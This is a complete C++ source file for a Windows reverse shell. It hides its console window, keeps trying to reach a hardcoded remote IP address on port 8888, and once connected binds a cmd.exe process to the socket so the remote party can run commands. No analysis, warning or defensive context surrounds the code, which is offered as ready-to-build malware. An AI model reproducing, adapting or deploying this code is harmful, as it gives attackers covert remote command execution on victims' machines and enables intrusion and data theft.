#include <winsock2.h>
#include <windows.h>
#include <string>
#include <shlobj_core.h>
#include <WS2tcpip.h>

#pragma comment(lib , "Ws2_32.lib")
#pragma warning(disable:4996)

#define SERVER_IP "94.198.218.23"
#define SERVER_PORT 8888

static void RunShell(const char* C2Server, int C2Port) {
	while (TRUE) {
		Sleep(1000);

		SOCKET mySocket;  
		sockaddr_in addr;
		WSADATA wsa;
		WSAStartup(MAKEWORD(2, 2), &wsa);
		mySocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, NULL, NULL);
		addr.sin_family = AF_INET;
		addr.sin_addr.s_addr = inet_addr(C2Server);
		addr.sin_port = htons(C2Port);

		if (WSAConnect(mySocket, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
			closesocket(mySocket);
			WSACleanup();
			continue;
		}
		else {
			wchar_t Process[] = L"cmd.exe";
			STARTUPINFO si;
			PROCESS_INFORMATION pi;
			ZeroMemory(&si, sizeof(si));
			si.cb = sizeof(si);
			si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
			si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)mySocket;
			CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
			WaitForSingleObject(pi.hProcess, INFINITE);
			CloseHandle(pi.hProcess);
			CloseHandle(pi.hThread);
			closesocket(mySocket);
			WSACleanup();
			break;
		}
	}
}

int main() {
	FreeConsole();
	RunShell(SERVER_IP, SERVER_PORT);
	return 0;
}